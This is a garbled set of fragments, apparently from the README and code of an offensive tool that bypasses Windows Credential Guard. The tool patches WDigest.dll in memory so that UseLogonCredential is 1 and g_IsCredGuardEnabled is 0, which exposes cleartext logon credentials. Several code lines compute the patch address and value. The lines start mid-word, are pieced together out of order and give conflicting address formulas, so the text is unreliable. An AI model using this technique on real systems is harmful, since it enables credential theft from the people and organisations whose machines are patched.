Credential Guard Bypass](https://itm4n.github.io/credential-guard-bypass/) by [itm4n](https://x.com/itm4n) - A great analysis from which I took the pattern to search the .text section of the DLL
Credential Guard by patching WDigest.dll using only NTAPI functions (exported by ntdll.dll). It is available in two flavours: C# and C++.
Credential* (to 1) and *g_IsCredGuardEnabled* (to 0).
Credential_Address = hModule + (useLogonCredential + offset + 6);
Credential_Address = hModule + useLogonCredential_Offset;
Credential_Offset = useLogonCredential + offset + 6;
Credential_Value = 1;
Credential_buffer[4] = { 0 };
